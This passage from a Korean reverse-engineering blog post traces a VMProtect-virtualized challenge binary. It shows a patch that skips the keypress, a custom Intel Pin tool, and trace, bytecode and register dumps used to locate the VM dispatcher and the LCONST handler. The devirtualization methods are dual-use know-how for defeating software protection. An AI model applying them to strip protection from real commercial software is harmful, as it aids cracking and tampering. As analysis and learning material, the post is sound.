&#xAC1C;&#xC5D0; &#xB2EC;&#xD558;&#xB294; &#xC758;&#xBBF8; &#xC5C6;&#xB294; junk instruction&#xACFC; control-flow flattening &#xAE30;&#xBC95;&#xC744; &#xC801;&#xC6A9;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xBCF8;&#xB798; VM &#xB514;&#xC2A4;&#xD328;&#xCC98;&#xC640; opcode &#xD578;&#xB4E4;&#xB7EC; &#xACBD;&#xB85C;&#xB97C; &#xCD18;&#xCD18;&#xD788; &#xD750;&#xD2B8;&#xB7EC;&#xB193;&#xC2B5;&#xB2C8;&#xB2E4;!   </p><p><img src="/2025/12/11/banda/VMPpart2/ko/image8.png" alt></p><p>&#xB514;&#xBC84;&#xAC70;&#xB85C; &#xD578;&#xB4E4;&#xB7EC;&#xC640; &#xB514;&#xC2A4;&#xD328;&#xCC98; &#xC548;&#xC744; &#xB3CC;&#xACE0;&#xB3CC;&#xACE0; &#xB3CC;&#xC544;&#xC11C; &#xB05D;&#xAE4C;&#xC9C0; <code>jmp</code> &#xD574;&#xBCF4;&#xBA74; &#xBB34;&#xC5B8;&#xAC00; &#xB098;&#xC624;&#xC9C0; &#xC54A;&#xC744;&#xAE4C; &#xC2F6;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAE30;&#xB300;&#xC640; &#xD568;&#xAED8; &#xB9C8;&#xC8FC;&#xD55C; &#xAC83;&#xC740; opcode &#xC758;&#xBBF8;&#xB97C; &#xAD6C;&#xD604;&#xD558;&#xB294; &#xD578;&#xB4E4;&#xB7EC; &#xD558;&#xB098;&#xB97C; &#xC81C;&#xB300;&#xB85C; &#xC7A1;&#xC740; &#xC904; &#xC54C;&#xC558;&#xB294;&#xB370;, &#xACB0;&#xAD6D; &#xC544;&#xBB34; &#xC758;&#xBBF8; &#xC5C6;&#xB294; &#xD2B8;&#xB7A8;&#xD3F4;&#xB9B0; &#xC5ED;&#xD560;&#xB9CC; &#xD558;&#xB294; &#xD578;&#xB4E4;&#xB7EC;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xC0C1;&#xD669;&#xC774; &#xC218;&#xC5C6;&#xC774; &#xBC18;&#xBCF5;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.  </p><p><img src="/2025/12/11/banda/VMPpart2/ko/image9.png" alt></p><p>&#xC800;&#xB294; <code>VMExit</code>&#xB97C; &#xC7A1;&#xACE0; &#xC2F6;&#xC5C8;&#xB294;&#xB370;, &#xC544;&#xBB34;&#xB9AC; &#xCC3E;&#xC544;&#xBD10;&#xB3C4; Handler &#x2192; dispatcher &#x2192; handler &#x2026; &#xAC00; &#xB9C8;&#xCE58; &#xCC9C;&#xAD6D;&#xC758; &#xACC4;&#xB2E8;&#xCC98;&#xB7FC; &#xBC18;&#xBCF5;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9C8;&#xCE58; &#xB514;&#xBC84;&#xAC70;&#xC5D0;&#xC11C;&#xB294; &#xC601;&#xC6D0;&#xD788; &#xC5EC;&#xAE30;&#xB97C; &#xBE60;&#xC838;&#xB098;&#xC62C; &#xC218; &#xC5C6;&#xC744; &#xAC83;&#xB9CC; &#xAC19;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; &#xD3C9;&#xC18C; CPU&#xCC98;&#xB7FC; &#xBB3C;&#xB9AC; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xC4F0;&#xB294;&#xAC8C; &#xC544;&#xB2C8;&#xB77C; &#xC2E4;&#xD589; &#xC911; <code>VIP</code>, <code>VSP</code> &#xAC19;&#xC740; &#xAC00;&#xC0C1; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB098; &#xC554;&#xD638;&#xD654;&#xB41C; Stack &#xC601;&#xC5ED;&#xC5D0; &#xAC12;&#xC744; &#xC228;&#xACA8;&#xB1A8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;.. <code>EAX</code>&#xB97C; &#xC544;&#xBB34;&#xB9AC; &#xCCD0;&#xB2E4;&#xBD10;&#xB3C4; &#xC758;&#xBBF8;&#xC788;&#xB294; &#xB370;&#xC774;&#xD130;&#xAC00; &#xB098;&#xC624;&#xC9C0; &#xC54A;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.  </p><p><img src="/2025/12/11/banda/VMPpart2/ko/image10.png" alt></p><p>&#x2026; &#xC5EC;&#xAE30;&#xC5D0;&#xC11C; &#xB514;&#xBC84;&#xAE45;&#xD558;&#xAE30;&#xC5D0;&#xB294; &#xC774;&#xBC88; &#xC0DD;&#xC774; &#xB354; &#xC9E7;&#xC740; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB978; &#xBC29;&#xBC95;&#xC744; &#xD55C;&#xBC88; &#xCC3E;&#xC544;&#xBD05;&#xC2DC;&#xB2E4;.</p><h3 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h3><pre><code class="hljs c"><span class="hljs-number">0040</span>D153 FF10           call dword ptr [eax]<span class="hljs-number">0040</span>D155 FF35 <span class="hljs-number">085F</span>4100  push dword ptr [<span class="hljs-number">415F</span>08]<span class="hljs-number">0040</span>D15B E8 <span class="hljs-number">623F</span>FFFF    call <span class="hljs-number">4010</span>C2<span class="hljs-number">0040</span>D160 <span class="hljs-number">83</span>C4 <span class="hljs-number">04</span>        add esp, <span class="hljs-number">4</span><span class="hljs-number">0040</span>D163 <span class="hljs-number">5</span>D             pop ebp<span class="hljs-number">0040</span>D164 C2 <span class="hljs-number">1000</span>        ret <span class="hljs-number">10</span></code></pre><p><img src="/2025/12/11/banda/VMPpart2/ko/image11.png" alt></p><p>Trace&#xB85C; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xD750;&#xB984;&#xC744; &#xCD94;&#xC801;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xBA3C;&#xC800; &#xC6D0;&#xBCF8; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0; &#xC57D;&#xAC04;&#xC758; &#xD328;&#xCE58;&#xB97C; &#xC801;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACE0;&#xC9C8;&#xC801;&#xC778; &#xBB38;&#xC81C;&#xC778;&#xC9C0; &#xC758;&#xB3C4;&#xB41C; &#xC0AC;&#xD56D;&#xC778;&#xC9C0; &#xBAA8;&#xB974;&#xACA0;&#xC73C;&#xB098; Intel Pin Tool&#xB85C; &#xC2E4;&#xD589;&#xD560; &#xACBD;&#xC6B0; &#xBB38;&#xC81C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xAC00; &#xBC31;&#xADF8;&#xB77C;&#xC6B4;&#xB4DC; &#xC0C1;&#xD0DC;&#xB85C;&#xB9CC; &#xB3CC;&#xC544;&#xAC14;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC2E4;&#xD589; &#xC9C1;&#xD6C4; &#xD544;&#xC790;&#xAC00; &#x2018;P&#x2019;&#xB97C; &#xB204;&#xB974;&#xC9C0; &#xC54A;&#xC544;&#xB3C4; &#xC989;&#xC2DC; VM Entry&#xB85C; &#xC9C4;&#xC785;&#xD558;&#xB3C4;&#xB85D; &#xD328;&#xCE58;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.  </p><h3 id="Pin&#xC744;-&#xC774;&#xC6A9;&#xD55C;-Trace-&#xC218;&#xC9D1;"><a href="#Pin&#xC744;-&#xC774;&#xC6A9;&#xD55C;-Trace-&#xC218;&#xC9D1;" class="headerlink" title="Pin&#xC744; &#xC774;&#xC6A9;&#xD55C; Trace &#xC218;&#xC9D1;"></a>Pin&#xC744; &#xC774;&#xC6A9;&#xD55C; Trace &#xC218;&#xC9D1;</h3><p>Intel Pin&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC2E4;&#xD589; &#xC911;&#xC5D0; &#xCF54;&#xB4DC;&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xC5EC; &#xB3D9;&#xC791;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xB3C4;&#xAD6C;&#xC785;&#xB2C8;&#xB2E4;. Pin&#xC740; &#xC2E4;&#xC81C; &#xC2E4;&#xD589; &#xD750;&#xB984;&#xC774; &#xC5B4;&#xB5A0;&#xD55C; &#xB09C;&#xB3C5;&#xD654; &#xAE30;&#xBC95;&#xC744; &#xC801;&#xC6A9;&#xD574;&#xB3C4;, &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xC2E4;&#xD589;&#xD558;&#xB294; <strong>&#xB2E8; &#xD558;&#xB098;&#xC758; &#xBA85;&#xB839;&#xC5B4;(Instruction)&#xB3C4; &#xB193;&#xCE58;&#xC9C0; &#xC54A;&#xACE0;</strong> &#xBAA8;&#xB450; &#xAC00;&#xB85C;&#xCC44;&#xC11C; &#xAE30;&#xB85D;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Trace&#xB97C; &#xC218;&#xC9D1;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xC815;&#xC801; &#xBD84;&#xC11D;&#xC73C;&#xB85C; &#xC544;&#xB798; &#xC8FC;&#xC18C;&#xB4E4;&#xC744; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><strong>gDispEntry (<code>0x004869BB</code>):</strong> VM Entry(&#xC9C4;&#xC785;&#xC810;)</li></ul><p><img src="/2025/12/11/banda/VMPpart2/ko/image12.png" alt></p><ul><li><strong>gHandler82 (<code>0x004181BB</code>):</strong> &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD574; &#xCC3E;&#xC740; &#xD2B9;&#xC815; &#xD578;&#xB4E4;&#xB7EC;(ID 82)&#xC758; &#xC9C4;&#xC785;&#xC810;</li></ul><pre><code class="hljs c"><span class="hljs-number">24566</span> vmtrace.outi:<span class="hljs-number">0x004869bb</span>:<span class="hljs-number">5</span>:<span class="hljs-number">68</span>EACF8694r:<span class="hljs-number">0x004869c0</span>:<span class="hljs-number">0x00401dcd</span>:<span class="hljs-number">0x00000000</span>:<span class="hljs-number">0x97010000</span>:<span class="hljs-number">0x00000000</span>:<span class="hljs-number">0x0000000a</span>:<span class="hljs-number">0x004011fc</span>:<span class="hljs-number">0x0019ff28</span>:<span class="hljs-number">0x0019ff20</span>:<span class="hljs-number">0x00000202</span>i:<span class="hljs-number">0x004869c0</span>:<span class="hljs-number">5</span>:E883A9FFFFr:<span class="hljs-number">0x00481348</span>:<span class="hljs-number">0x00401dcd</span>:<span class="hljs-number">0x00000000</span>:<span class="hljs-number">0x97010000</span>:<span class="hljs-number">0x00000000</span>:<span class="hljs-number">0x0000000a</span>:<span class="hljs-number">0x004011fc</span>:<span class="hljs-number">0x0019ff28</span>:<span class="hljs-number">0x0019ff1c</span>:<span class="hljs-number">0x00000202</span>i:<span class="hljs-number">0x00481348</span>:<span class="hljs-number">1</span>:<span class="hljs-number">51</span>r:<span class="hljs-number">0x00481349</span>:<span class="hljs-number">0x00401dcd</span>:<span class="hljs-number">0x00000000</span>:<span class="hljs-number">0x97010000</span>:<span class="hljs-number">0x00000000</span>:<span class="hljs-number">0x0000000a</span>:<span class="hljs-number">0x004011fc</span>:<span class="hljs-number">0x0019ff28</span>:<span class="hljs-number">0x0019ff18</span>:<span class="hljs-number">0x00000202</span>i:<span class="hljs-number">0x00481349</span>:<span class="hljs-number">5</span>:E9CA50FBFFr:<span class="hljs-number">0x00436418</span>:<span class="hljs-number">0x00401dcd</span>:<span class="hljs-number">0x00000000</span>:<span class="hljs-number">0x97010000</span>:<span class="hljs-number">0x00000000</span>:<span class="hljs-number">0x0000000a</span>:<span class="hljs-number">0x004011fc</span>:<span class="hljs-number">0x0019ff28</span>:<span class="hljs-number">0x0019ff18</span>:<span class="hljs-number">0x00000202</span>i:<span class="hljs-number">0x00436418</span>:<span class="hljs-number">1</span>:<span class="hljs-number">55</span></code></pre><p>&#xBA3C;&#xC800; VMProtect VM&#xC774; &#xD55C; &#xC0AC;&#xC774;&#xD074;&#xC744; &#xB3C4;&#xB294; &#xAD6C;&#xAC04;&#xC744; Trace&#xC5D0;&#xC11C; &#xCD94;&#xCD9C;&#xD588;&#xB294;&#xB370;, &#xC774; &#xACFC;&#xC815;&#xB9CC;&#xC73C;&#xB85C;&#xB3C4; &#xC57D; <code>n0,000</code>&#xC904;&#xC5D0; &#xB2EC;&#xD558;&#xB294; &#xAE30;&#xB85D;&#xC774; &#xC0DD;&#xC131;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC774; &#xC815;&#xB3C4; &#xADDC;&#xBAA8;&#xB77C;&#xBA74; &#xD578;&#xB4E4;&#xB7EC; &#xB2E8;&#xC704;&#xB85C; &#xBD84;&#xB9AC;&#xD558;&#xACE0; &#xBC18;&#xBCF5;&#xB418;&#xB294; &#xD328;&#xD134;&#xC744; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC2DD;&#xBCC4;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC774; &#xD544;&#xC218;&#xC801;&#xC774;&#xACA0;&#xB124;&#xC694;. </p><p><code>i</code>: &#xC904;&#xC740; &#xC2E4;&#xD589;&#xB41C; &#xBA85;&#xB839;&#xC5B4;,<br><code>r</code>: &#xC904;&#xC740; &#xD574;&#xB2F9; &#xC2DC;&#xC810;&#xC758; &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xBC0F; &#xC2A4;&#xD0DD; &#xC0C1;&#xD0DC;&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xBA70;,<br>JonathanSalwan&#xC758; <a href="https://github.com/JonathanSalwan/VMProtect-devirtualization">VMProtect-devirtualization</a> &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xAC00; &#xB9CE;&#xC740; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;!  <br><br></p><p><strong><code>uniq -c</code>&#xB85C; &#xBCF8; VM &#xBA54;&#xC778; &#xB8E8;&#xD504; &#xB7; &#xD578;&#xB4E4;&#xB7EC; &#xD6C4;&#xBCF4; &#xC2DD;&#xBCC4;</strong></p><pre><code class="hljs c"><span class="hljs-number">108</span> <span class="hljs-number">0x0047f287</span><span class="hljs-number">108</span> <span class="hljs-number">0x0044a8ae</span><span class="hljs-number">108</span> <span class="hljs-number">0x0044a8ac</span><span class="hljs-number">108</span> <span class="hljs-number">0x0044a8ab</span><span class="hljs-number">108</span> <span class="hljs-number">0x0044a8a7</span><span class="hljs-number">107</span> <span class="hljs-number">0x004181bb</span>  <span class="hljs-number">64</span> <span class="hljs-number">0x00464679</span> <span class="hljs-number">10</span> <span class="hljs-number">0x0049acd6</span> <span class="hljs-number">10</span> <span class="hljs-number">0x0049acd4</span> <span class="hljs-number">10</span> <span class="hljs-number">0x0049acd2</span></code></pre><p>&#xC218;&#xC9D1;&#xB41C; Trace&#xC5D0;&#xC11C; &#xB3D9;&#xC77C; &#xC8FC;&#xC18C;&#xC758; &#xC2E4;&#xD589; &#xBE48;&#xB3C4;&#xB97C; <code>uniq -c</code> &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xACC4;&#xC0B0;&#xD574; &#xAC00;&#xC7A5; &#xC790;&#xC8FC; &#xD638;&#xCD9C;&#xB41C; &#xC704;&#xCE58;&#xB97C; &#xB098;&#xC5F4;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1A0;&#xB300;&#xB85C; &#xC815;&#xC801; &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD574; &#xC5ED;&#xD560;&#xC744; &#xBD84;&#xB958;&#xD574;&#xBCF4;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC810;&#xC744; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xAC00;&#xC7A5; &#xB192;&#xC740; &#xBE48;&#xB3C4; 108&#xD68C;: VM Dispatcher<ul><li><strong>VM &#xB514;&#xC2A4;&#xD328;&#xCC98; (Dispatcher)</strong><br><code>0x0047f287</code>, <code>0x0044a8a7</code> &#xB4F1; &#xC5EC;&#xB7EC; dispatch &#xC870;&#xAC01;&#xC774; &#xB3D9;&#xC77C;&#xD55C; 108&#xBC88; &#xBE48;&#xB3C4;&#xB85C; &#xBC18;&#xBCF5;&#xB418;&#xB294; &#xAC83;&#xC774; &#xD655;&#xC778;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. Dispatcher&#xC774; Fetch &#x2192; Decode &#x2192; Dispatch &#x2192; Execute CPU &#xC0AC;&#xC774;&#xD074;&#xC744; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB85C; &#xAD6C;&#xD604;&#xD55C; &#xBD80;&#xBD84;&#xC774;&#xBA70;, dispatcher&#xC774; &#xC2E4;&#xC81C; &#xC758;&#xBBF8; &#xC788;&#xB294; &#xC5F0;&#xC0B0;&#xC744; &#xC218;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBBC0;&#xB85C; &#xC81C;&#xC678;&#xD558;&#xACE0; &#xB118;&#xC5B4;&#xAC11;&#xC2DC;&#xB2E4;.</li></ul></li><li>&#xB450; &#xBC88;&#xC9F8;&#xB85C; &#xB192;&#xC740; &#xBE48;&#xB3C4; 107&#xD68C;: &#xD578;&#xB4E4;&#xB7EC; ID 82<ul><li><strong>&#xAC00;&#xC7A5; &#xB9CE;&#xC774; &#xC4F0;&#xC778; &#xD578;&#xB4E4;&#xB7EC; (<code>LCONST</code>)</strong><br><code>0x004181BB</code>&#xB294; VMProtect&#xAC00; &#xC790;&#xC8FC; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC2A4;&#xD0DD; &#xAE30;&#xBC18;&#xC758; &#xAC00;&#xC0C1; &#xBA38;&#xC2E0; &#xD2B9;&#xC131;&#xC744; &#xC0DD;&#xAC01;&#xD574;&#xBCFC; &#xB54C;, &#xC0C1;&#xC218; &#xB85C;&#xB4DC;(<code>LCONST</code>) &#xACC4;&#xC5F4; &#xD578;&#xB4E4;&#xB7EC;&#xB77C;&#xACE0; &#xCD94;&#xCE21;&#xD574;&#xBCFC; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC2A4;&#xD0DD; &#xBA38;&#xC2E0;&#xC5D0;&#xC11C; &#xBAA8;&#xB4E0; &#xC5F0;&#xC0B0;&#xC740; &#xC2A4;&#xD0DD; &#xC704;&#xC5D0;&#xC11C; &#xC774;&#xB904;&#xC9C0;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xB85C;&#xB4DC;/&#xBCF5;&#xC0AC;/&#xC774;&#xB3D9; &#xAD00;&#xB828; &#xC5F0;&#xC0B0;&#xC774; &#xB9CE;&#xC774; &#xBC18;&#xBCF5;&#xB418;&#xACA0;&#xC8E0;? &#xAC00;&#xC7A5; &#xBE48;&#xB3C4;&#xAC00; &#xB192;&#xC740; &#xD578;&#xB4E4;&#xB7EC;&#xB97C; &#xC6B0;&#xC120; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xC811;&#xADFC;&#xC774; &#xD6A8;&#xC728;&#xC801;&#xC785;&#xB2C8;&#xB2E4;.  </li></ul></li></ul><h3 id="PIN-Trace-&#xB2E4;&#xC2DC;-&#xD558;&#xAE30;"><a href="#PIN-Trace-&#xB2E4;&#xC2DC;-&#xD558;&#xAE30;" class="headerlink" title="PIN Trace &#xB2E4;&#xC2DC; &#xD558;&#xAE30;"></a>PIN Trace &#xB2E4;&#xC2DC; &#xD558;&#xAE30;</h3><p>&#xAE30;&#xC874; pin&#xC5D0;&#xB294; &#xC774;&#xBC88;&#xC5D0;&#xB294; &#xC81C;&#xACF5;&#xB41C; Intel Pin Tool &#xD15C;&#xD50C;&#xB9BF;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C;, ID 82 &#xD578;&#xB4E4;&#xB7EC;&#xB9CC; &#xACE8;&#xB77C;&#xC11C; &#xCD94;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xCD5C;&#xC801;&#xD654;&#xB41C; Pintool&#xC744; &#xAC1C;&#xBC1C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xB3C4;&#xAD6C;&#xB97C; &#xC774;&#xC6A9;&#xD574; VMProtect VM&#xC5D0;&#xC11C; ID 82&#xAC00; &#xC2E4;&#xC81C;&#xB85C; &#xC5B4;&#xB5A4; &#xC5F0;&#xC0B0;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294;&#xC9C0; &#xC5ED;&#xCD94;&#xC801;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;!  </p><p><img src="/2025/12/11/banda/VMPpart2/ko/image13.png" alt></p><p>VMProtect &#xAC00;&#xC0C1;&#xBA38;&#xC2E0; &#xD55C; &#xBA85;&#xB839;&#xC5B4;&#xAC00; &#xC5B4;&#xB5A4; &#xC77C;&#xC744; &#xD558;&#xB294;&#xC9C0; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xCEA1;&#xCC98;&#xD558;&#xAE30; &#xC704;&#xD574; Pin&#xC744; &#xAC1C;&#xBC1C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC00;&#xC0C1;&#xD654; &#xD574;&#xC81C; &#xAD00;&#xC810;&#xC5D0;&#xC11C; &#xACE0;&#xC815;&#xB41C; &#xB450; IP &#xC9C0;&#xC810;&#xC744; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xD55C; VM &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC7A1;&#xACE0;, &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC; &#xB85C;&#xB529; &#xC2DC;&#xC810;&#xC5D0;&#xC11C; <code>ESI</code>&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; 4&#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xCEA1;&#xCC98;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xC600;&#xC73C;&#xBA70;, &#xD578;&#xB4E4;&#xB7EC; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xC5F0;&#xC0B0;&#xC774; &#xB05D;&#xB098;&#xACE0; &#xACB0;&#xACFC;&#xB97C; &#xC2A4;&#xD0DD;&#xC73C;&#xB85C; &#xD478;&#xC2DC;&#xD558;&#xB294; CONTEXT&#xC5D0;&#xC11C; <code>EAX</code>/<code>EDI</code> &#xAC12;&#xC744; &#xC77D;&#xB3C4;&#xB85D; &#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.  </p><p><img src="/2025/12/11/banda/VMPpart2/ko/image14.png" alt></p><p>&#xBE4C;&#xB4DC;&#xD55C; <code>MyPinTool</code>&#xC744; &#xC774;&#xC6A9;&#xD574; 3&#xAC00;&#xC9C0; &#xC815;&#xBCF4;&#xB97C; &#xC218;&#xC9D1;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.  <br><br></p><p><strong>1. vmtrace.out: &#xB514;&#xC2A4;&#xD328;&#xCC98; &#xC9C4;&#xC785;&#xBD80;&#xD130; VM &#xC885;&#xB8CC;&#xAE4C;&#xC9C0;&#xC758; &#xC804;&#xCCB4; x86 &#xBA85;&#xB839;&#xC5B4;</strong></p><pre><code class="hljs c"><span class="hljs-meta">#main exe: [0x00400000, 0x00581fff)</span><span class="hljs-number">004869b</span>b <span class="hljs-number">68</span> EA CF <span class="hljs-number">86</span> <span class="hljs-number">94</span><span class="hljs-number">004869</span>c0 E8 <span class="hljs-number">83</span> A9 FF FF<span class="hljs-number">00481348</span> <span class="hljs-number">51</span><span class="hljs-number">00481349</span> E9 CA <span class="hljs-number">50</span> FB FF<span class="hljs-number">00436418</span> <span class="hljs-number">55</span><span class="hljs-number">00436419</span> <span class="hljs-number">50</span><span class="hljs-number">0043641</span>a <span class="hljs-number">66</span> F7 D5<span class="hljs-number">0043641</span>d E9 <span class="hljs-number">15</span> <span class="hljs-number">92</span> FE FF<span class="hljs-number">0041f</span>637 <span class="hljs-number">57</span><span class="hljs-number">0041f</span>638 <span class="hljs-number">0F</span> BF FF...</code></pre><p>&#xC774; &#xD30C;&#xC77C;&#xC5D0;&#xB294; <code>0x004869BB</code>&#xC5D0;&#xC11C; VM &#xB514;&#xC2A4;&#xD328;&#xCC98; &#xC9C4;&#xC785; &#xD6C4;, VM&#xC774; &#xB05D;&#xB0A0; &#xB54C;&#xAE4C;&#xC9C0; &#xC2E4;&#xD589;&#xB41C; &#xBAA8;&#xB4E0; x86 &#xBA85;&#xB839;&#xC5B4;&#xAC00; &#xC21C;&#xC11C;&#xB300;&#xB85C; &#xAE30;&#xB85D;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBA85;&#xB839;&#xC5B4; &#xC8FC;&#xC18C;, &#xAE30;&#xACC4;&#xC5B4; &#xBC14;&#xC774;&#xD2B8;&#xB9CC; &#xB2F4;&#xAE30;&#xAC8C; &#xD558;&#xACE0;, trace&#xB97C; &#xB530;&#xBA74;&#xC11C; txt &#xD30C;&#xC77C;&#xC774; &#xD568;&#xAED8; &#xCD94;&#xCD9C;&#xB418;&#xB3C4;&#xB85D; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.  </p><p><strong>2. bytecode_values.txt: ID 82 &#xD578;&#xB4E4;&#xB7EC; &#xC9C4;&#xC785; &#xC2DC; <code>[ESI]</code> &#xAC12; (&#xC989;, &#xAC00;&#xC0C1; &#xBA85;&#xB839;&#xC5B4; &#xC778;&#xC790;)</strong></p><pre><code class="hljs c"><span class="hljs-number">1</span>,<span class="hljs-number">0x0047fa5f</span>,<span class="hljs-number">0x1ecbf564</span>,<span class="hljs-number">0x000271c9</span>,<span class="hljs-number">0x004892af</span><span class="hljs-number">2</span>,<span class="hljs-number">0x0045cb33</span>,<span class="hljs-number">0x1ec6b25f</span>,<span class="hljs-number">0xfffcff9f</span>,<span class="hljs-number">0x00432085</span><span class="hljs-number">3</span>,<span class="hljs-number">0x0046ef95</span>,<span class="hljs-number">0x1ec5393d</span>,<span class="hljs-number">0xfffdab5b</span>,<span class="hljs-number">0x0043cc41</span># Total ID82 calls: <span class="hljs-number">3</span></code></pre><p>bytecode values&#xAC00; &#xCD94;&#xCD9C;&#xB41C; &#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xC5B4;&#xBCF4;&#xBA74;, ID 82&#xAC00; &#xC5B4;&#xB5A4; &#xC0C1;&#xC218;/&#xC778;&#xC790;&#xB97C; &#xC785;&#xB825;&#xC73C;&#xB85C; &#xBC1B;&#xC558;&#xB294;&#xC9C0; &#xB85C;&#xADF8;&#xB85C; &#xB0A8;&#xACA8;&#xC90D;&#xB2C8;&#xB2E4;. &#xC5EC;&#xB7EC; &#xD638;&#xCD9C;&#xC5D0; &#xB300;&#xD574; &#xC778;&#xC790; &#xD328;&#xD134;&#xC744; &#xBE44;&#xAD50;&#xD558;&#xBA74;, &#xC774; &#xD578;&#xB4E4;&#xB7EC;&#xAC00; &#xC0C1;&#xC218;&#xB97C; &#xC2A4;&#xD0DD;&#xC5D0; &#xD478;&#xC2DC;&#xD558;&#xB294;&#xC9C0;, &#xC778;&#xC790;&#xC5D0; &#xD2B9;&#xC815; &#xC5F0;&#xC0B0;&#xC744; &#xC50C;&#xC6B0;&#xB294;&#xC9C0;, &#xC778;&#xB371;&#xC2A4;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294;&#xC9C0; &#xB4F1;&#xC744; &#xCD94;&#xB860;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD6C4;&#xC5D0; Triton&#xC5D0;&#xC11C; symbolic value&#xB97C; &#xB123;&#xACE0; &#xB3CC;&#xB9B4; &#xB54C; &#xAD6C;&#xCCB4; &#xAC12;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.  </p><p><strong>3. id82_registers.txt: &#xD578;&#xB4E4;&#xB7EC; &#xC9C4;&#xC785; &#xC2DC;&#xC810;&#xC758; &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xC0C1;&#xD0DC; &#xC2A4;&#xB0C5;&#xC0F7;</strong></p><pre><code class="hljs c">=== VM Entry (<span class="hljs-number">0x004869bb</span>) ===INIT_ESI=<span class="hljs-number">0x0000000a</span>INIT_EBP=<span class="hljs-number">0x0019ff74</span>INIT_ESP=<span class="hljs-number">0x0019ff04</span>===========================ID82_001: IP=<span class="hljs-number">0x004323ff</span> EAX=<span class="hljs-number">0x000271c9</span> EBX=<span class="hljs-number">0x00458b96</span> ECX=<span class="hljs-number">0x00000020</span> EDX=<span class="hljs-number">0x00000000</span> ESI=<span class="hljs-number">0x0047fa63</span> EDI=<span class="hljs-number">0x004892af</span> EBP=<span class="hljs-number">0x0019fed8</span> ESP=<span class="hljs-number">0x0019fe18</span> BYTECODE=<span class="hljs-number">0x1ecbf564</span>ID82_002: IP=<span class="hljs-number">0x004323ff</span> EAX=<span class="hljs-number">0xfffcff9f</span> EBX=<span class="hljs-number">0xffb934ac</span> ECX=<span class="hljs-number">0x00000020</span> EDX=<span class="hljs-number">0x0000422a</span> ESI=<span 